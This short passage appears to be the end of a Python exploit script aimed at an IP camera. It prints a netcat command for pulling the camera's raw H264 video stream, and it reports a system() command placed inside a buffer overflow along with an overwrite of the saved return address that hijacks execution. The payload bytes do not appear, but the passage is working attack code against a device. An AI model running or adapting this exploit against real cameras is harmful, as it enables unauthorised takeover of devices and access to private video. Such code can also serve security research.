    print("raw H264 main stream: nc <camera-ip> 8555 > stream.h264")
    if saved_ra is not None:
        print(f"system() command at overflow offset 0x{COMMAND_OFFSET_FROM_FIELD:x}: {BOOTSTRAP_COMMAND.decode('ascii')}")
        print(
            f"saved RA overwrite at offset 0x{SAVED_RA_OFFSET_FROM_FIELD:x}: "
            f"0x{saved_ra:08x} ({args.stone_main})"
        )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
